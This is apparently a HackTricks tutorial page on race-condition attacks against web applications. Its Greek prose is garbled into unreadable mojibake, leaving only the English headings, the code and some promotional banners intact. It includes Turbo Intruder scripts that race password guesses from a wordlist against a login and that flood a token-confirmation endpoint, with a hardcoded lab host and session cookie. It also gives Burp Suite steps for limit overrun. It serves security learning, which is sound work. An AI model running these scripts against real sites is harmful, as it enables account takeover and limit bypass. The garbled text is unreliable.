# Race Condition

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** Ï€Î¿Ï… Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î± **Ï€Î¹Î¿ Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î±** ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï„Î·Ï‚ ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î±Ï‚.\
Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎ®Î¼ÎµÏÎ±:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ğŸ’¬ [**ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="warning" %}
Î“Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î²Î±Î¸Î¹Î¬ ÎºÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÏ„Î¿ [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Î•Î½Î¯ÏƒÏ‡Ï…ÏƒÎ· Î•Ï€Î¹Î¸Î­ÏƒÎµÏ‰Î½ Race Condition

Î¤Î¿ ÎºÏÏÎ¹Î¿ ÎµÎ¼Ï€ÏŒÎ´Î¹Î¿ ÏƒÏ„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Ï‰Î½ race conditions ÎµÎ¯Î½Î±Î¹ Î· Î´Î¹Î±ÏƒÏ†Î¬Î»Î¹ÏƒÎ· ÏŒÏ„Î¹ Ï€Î¿Î»Î»Î±Ï€Î»Î¬ Î±Î¹Ï„Î®Î¼Î±Ï„Î± Ï‡ÎµÎ¹ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½Î±, Î¼Îµ **Ï€Î¿Î»Ï Î¼Î¹ÎºÏÎ® Î´Î¹Î±Ï†Î¿ÏÎ¬ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÏŒÎ½Î¿Ï…Ï‚ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ Ï„Î¿Ï…Ï‚â€”Î¹Î´Î±Î½Î¹ÎºÎ¬, Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ Î±Ï€ÏŒ 1ms**.

Î•Î´Ï Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î³Î¹Î± Ï„Î· Î£Ï…Î³Ï‡ÏÎ¿Î½Î¹ÏƒÎ¼ÏŒ Î‘Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½:

#### HTTP/2 Î•Ï€Î¯Î¸ÎµÏƒÎ· ÎœÎ¿Î½Î±Î´Î¹ÎºÎ¿Ï Î Î±ÎºÎ­Ï„Î¿Ï… vs. HTTP/1.1 Î£Ï…Î³Ï‡ÏÎ¿Î½Î¹ÏƒÎ¼ÏŒÏ‚ Î¤ÎµÎ»ÎµÏ…Ï„Î±Î¯Î¿Ï… Byte

* **HTTP/2**: Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Î´ÏÎ¿ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½ Î¼Î­ÏƒÏ‰ Î¼Î¹Î±Ï‚ Î¼ÏŒÎ½Î¿ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ TCP, Î¼ÎµÎ¹ÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Ï„Î¿Ï… jitter ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î»ÏŒÎ³Ï‰ Ï€Î±ÏÎ±Î»Î»Î±Î³ÏÎ½ ÏƒÏ„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®, Î´ÏÎ¿ Î±Î¹Ï„Î®Î¼Î±Ï„Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î¬ Î³Î¹Î± Î¼Î¹Î± ÏƒÏ…Î½ÎµÏ€Î® ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· race condition.
* **HTTP/1.1 'Î£Ï…Î³Ï‡ÏÎ¿Î½Î¹ÏƒÎ¼ÏŒÏ‚ Î¤ÎµÎ»ÎµÏ…Ï„Î±Î¯Î¿Ï… Byte'**: Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï€ÏÎ¿-Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Ï„Ï‰Î½ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÏ‰Î½ Ï„Î¼Î·Î¼Î¬Ï„Ï‰Î½ 20-30 Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½, ÎºÏÎ±Ï„ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Î¼Î¹ÎºÏÏŒ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î¼Î±Î¶Î¯, ÎµÏ€Î¹Ï„Ï…Î³Ï‡Î¬Î½Î¿Î½Ï„Î±Ï‚ Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½Î· Î¬Ï†Î¹Î¾Î· ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®.

**Î— Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¯Î± Î³Î¹Î± Ï„Î¿Î½ Î£Ï…Î³Ï‡ÏÎ¿Î½Î¹ÏƒÎ¼ÏŒ Î¤ÎµÎ»ÎµÏ…Ï„Î±Î¯Î¿Ï… Byte** Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹:

1. Î‘Ï€Î¿ÏƒÏ„Î¿Î»Î® ÎºÎµÏ†Î±Î»Î¯Î´Ï‰Î½ ÎºÎ±Î¹ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏÎ¼Î±Ï„Î¿Ï‚ Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î¿ Ï„ÎµÎ»Î¹ÎºÏŒ byte Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï„ÎµÏÎ¼Î±Ï„Î¯ÏƒÎµÏ„Îµ Ï„Î· ÏÎ¿Î®.
2. Î Î±ÏÏƒÎ· Î³Î¹Î± 100ms Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Î±Ï€Î¿ÏƒÏ„Î¿Î»Î®.
3. Î‘Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· TCP\_NODELAY Î³Î¹Î± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ Î±Î»Î³ÏŒÏÎ¹Î¸Î¼Î¿ Nagle Î³Î¹Î± Ï„Î·Î½ Î¿Î¼Î±Î´Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Ï‰Î½ Ï„ÎµÎ»Î¹ÎºÏÎ½ Ï€Î»Î±Î¹ÏƒÎ¯Ï‰Î½.
4. Ping Î³Î¹Î± Î½Î± Î¶ÎµÏƒÏ„Î¬Î½ÎµÏ„Îµ Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ·.

Î— ÎµÏ€ÏŒÎ¼ÎµÎ½Î· Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Ï„Ï‰Î½ ÏƒÏ…Î³ÎºÏÎ±Ï„Î·Î¼Î­Î½Ï‰Î½ Ï€Î»Î±Î¹ÏƒÎ¯Ï‰Î½ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï‰Ï‚ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î·Î½ Î¬Ï†Î¹Î¾Î® Ï„Î¿Ï…Ï‚ ÏƒÎµ Î­Î½Î± Î¼ÏŒÎ½Î¿ Ï€Î±ÎºÎ­Ï„Î¿, ÎµÏ€Î±Î»Î·Î¸ÎµÏÏƒÎ¹Î¼Î¿ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Wireshark. Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î´ÎµÎ½ Î¹ÏƒÏ‡ÏÎµÎ¹ Î³Î¹Î± ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î±, Ï„Î± Î¿Ï€Î¿Î¯Î± Î´ÎµÎ½ ÎµÎ¼Ï€Î»Î­ÎºÎ¿Î½Ï„Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÏƒÎµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ RC.

### Î ÏÎ¿ÏƒÎ±ÏÎ¼Î¿Î³Î® ÏƒÏ„Î·Î½ Î‘ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ® Î”Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®

Î— ÎºÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· Ï„Î·Ï‚ Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ®Ï‚ Ï„Î¿Ï… ÏƒÏ„ÏŒÏ‡Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î·. ÎŸÎ¹ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ front-end Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î¿ÏÎ½ Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬, ÎµÏ€Î·ÏÎµÎ¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ Ï‡ÏÎ¿Î½Î¿Î´Î¹Î¬Î³ÏÎ±Î¼Î¼Î±. Î— Ï€ÏÎ¿Î»Î·Ï€Ï„Î¹ÎºÎ® Î¸Î­ÏÎ¼Î±Î½ÏƒÎ· Ï„Î·Ï‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ ÏƒÏ„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®, Î¼Î­ÏƒÏ‰ Î±ÏƒÎ®Î¼Î±Î½Ï„Ï‰Î½ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ Ï‡ÏÎ¿Î½Î¿Î´Î¹Î¬Î³ÏÎ±Î¼Î¼Î± Ï„Ï‰Î½ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½.

#### Î”Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· ÎšÎ»ÎµÎ¹Î´ÏÎ¼Î±Ï„Î¿Ï‚ Î’Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿Ï… ÏƒÎµ Î£Ï…Î½ÎµÎ´ÏÎ¯ÎµÏ‚

Î Î»Î±Î¯ÏƒÎ¹Î± ÏŒÏ€Ï‰Ï‚ Î¿ Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¹ÏÎ½ PHP ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÎºÎ±Ï„Î¬ ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±, ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î±Ï€Î¿ÎºÏÏÏ€Ï„Î¿Î½Ï„Î±Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚. Î— Ï‡ÏÎ®ÏƒÎ· Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏÎ½ tokens ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±Ï‚ Î³Î¹Î± ÎºÎ¬Î¸Îµ Î±Î¯Ï„Î·Î¼Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¶Î®Ï„Î·Î¼Î±.

#### Î¥Ï€ÎµÏÎ½Î¯ÎºÎ·ÏƒÎ· Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏÎ½ Î¡Ï…Î¸Î¼Î¿Ï Î® Î ÏŒÏÏ‰Î½

Î•Î¬Î½ Î· Î¸Î­ÏÎ¼Î±Î½ÏƒÎ· Ï„Î·Ï‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ Î±Î½Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ®, Î· Ï€ÏÏŒÎºÎ»Î·ÏƒÎ· ÎºÎ±Î¸Ï…ÏƒÏ„ÎµÏÎ®ÏƒÎµÏ‰Î½ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿Ï ÏÏ…Î¸Î¼Î¿Ï Î® Ï€ÏŒÏÏ‰Î½ ÏƒÏ„Î¿Ï…Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ Î¹ÏƒÏ„Î¿Ï ÏƒÎºÏŒÏ€Î¹Î¼Î± Î¼Î­ÏƒÏ‰ Ï€Î»Î·Î¼Î¼ÏÏÎ±Ï‚ ÏˆÎµÏÏ„Î¹ÎºÏ‰Î½ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½ÎµÎ¹ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¼Î¿Î½Î±Î´Î¹ÎºÎ¿Ï Ï€Î±ÎºÎ­Ï„Î¿Ï… Ï€ÏÎ¿ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± ÎºÎ±Î¸Ï…ÏƒÏ„Î­ÏÎ·ÏƒÎ· ÏƒÏ„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Ï€Î¿Ï… ÎµÏ…Î½Î¿ÎµÎ¯ Ï„Î¹Ï‚ race conditions.

## Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î•Ï€Î¹Î¸Î­ÏƒÎµÏ‰Î½

* **Tubo Intruder - Î•Ï€Î¯Î¸ÎµÏƒÎ· HTTP2 Î¼Î¿Î½Î±Î´Î¹ÎºÎ¿Ï Ï€Î±ÎºÎ­Ï„Î¿Ï… (1 endpoint)**: ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î¿ **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î»Î»Î¬Î¾ÎµÏ„Îµ ÏƒÏ„Î·Î½ Î±Î¯Ï„Î·ÏƒÎ· Ï„Î·Î½ Ï„Î¹Î¼Î® Ï€Î¿Ï… Î¸Î­Î»ÎµÏ„Îµ Î½Î± ÏƒÏ€Î¬ÏƒÎµÏ„Îµ Î³Î¹Î± **`%s`** ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ Ï„Î¿ **`examples/race-single-packer-attack.py`** Î±Ï€ÏŒ Ï„Î·Î½ Î±Î½Î±Ï€Ï„Ï…ÏƒÏƒÏŒÎ¼ÎµÎ½Î· Î»Î¯ÏƒÏ„Î±:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Î•Î¬Î½ Ï€ÏÏŒÎºÎµÎ¹Ï„Î±Î¹ Î½Î± **ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ Ï„Î¹Î¼Î­Ï‚**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼Î¹Î± Î»Î¯ÏƒÏ„Î± Î»Î­Î¾ÎµÏ‰Î½ Î±Ï€ÏŒ Ï„Î¿ Ï€ÏÏŒÏ‡ÎµÎ¹ÏÎ¿:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Î‘Î½ Î¿ Î¹ÏƒÏ„ÏŒÏ„Î¿Ï€Î¿Ï‚ Î´ÎµÎ½ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ HTTP2 (Î¼ÏŒÎ½Î¿ HTTP1.1) Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ `Engine.THREADED` Î® `Engine.BURP` Î±Î½Ï„Î¯ Î³Î¹Î± `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - HTTP2 ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¼ÎµÎ¼Î¿Î½Ï‰Î¼Î­Î½Î¿Ï… Ï€Î±ÎºÎ­Ï„Î¿Ï… (Î Î¿Î»Î»Î­Ï‚ Ï„ÎµÎ»Î¹ÎºÎ­Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚)**: Î£Îµ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± ÏƒÎµ 1 Ï„ÎµÎ»Î¹ÎºÎ® Î´Î¹Î±Î´ÏÎ¿Î¼Î® ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï€Î¿Î»Î»Î±Ï€Î»Î¬ ÏƒÎµ Î¬Î»Î»ÎµÏ‚ Ï„ÎµÎ»Î¹ÎºÎ­Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚ Î³Î¹Î± Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ RCE, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ `race-single-packet-attack.py` Î¼Îµ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿ ÏƒÏ„Î¿ **Repeater** Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Î½Î­Î±Ï‚ ÎµÏ€Î¹Î»Î¿Î³Î®Ï‚ '**Î‘Ï€Î¿ÏƒÏ„Î¿Î»Î® Î¿Î¼Î¬Î´Î±Ï‚ Ï€Î±ÏÎ¬Î»Î»Î·Î»Î±**' ÏƒÏ„Î¿ Burp Suite.
* Î“Î¹Î± **limit-overrun** Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î±Ï€Î»Î¬ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿ **Î¯Î´Î¹Î¿ Î±Î¯Ï„Î·Î¼Î± 50 Ï†Î¿ÏÎ­Ï‚** ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î±.
* Î“Î¹Î± **connection warming**, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ** ÏƒÏ„Î·Î½ **Î±ÏÏ‡Î®** Ï„Î·Ï‚ **Î¿Î¼Î¬Î´Î±Ï‚** ÎºÎ¬Ï€Î¿Î¹Î± **Î±Î¹Ï„Î®Î¼Î±Ï„Î±** ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î¿ Î¼Î· ÏƒÏ„Î±Ï„Î¹ÎºÏŒ Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… web server.
* Î“Î¹Î± **delaying** Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± **Î¼ÎµÏ„Î±Î¾Ï** Ï„Î·Ï‚ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ **ÎµÎ½ÏŒÏ‚ Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ ÎºÎ±Î¹ ÎµÎ½ÏŒÏ‚ Î¬Î»Î»Î¿Ï…** ÏƒÎµ 2 Ï…Ï€Î¿ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚ Î²Î·Î¼Î¬Ï„Ï‰Î½, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î±Î¹Ï„Î®Î¼Î±Ï„Î± Î¼ÎµÏ„Î±Î¾Ï** ÎºÎ±Î¹ Ï„Ï‰Î½ Î´ÏÎ¿ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½.
* Î“Î¹Î± Î­Î½Î± **multi-endpoint** RC Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Î±ÏÏ‡Î¯ÏƒÎµÏ„Îµ Î½Î± ÏƒÏ„Î­Î»Î½ÎµÏ„Îµ Ï„Î¿ **Î±Î¯Ï„Î·Î¼Î±** Ï€Î¿Ï… **Ï€Î·Î³Î±Î¯Î½ÎµÎ¹ ÏƒÏ„Î·Î½ ÎºÏÏ…Ï†Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·** ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± **50 Î±Î¹Ï„Î®Î¼Î±Ï„Î±** Î±Î¼Î­ÏƒÏ‰Ï‚ Î¼ÎµÏ„Î¬ Ï€Î¿Ï… **ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎ¿Î½Ï„Î±Î¹ Ï„Î·Î½ ÎºÏÏ…Ï†Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·**.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

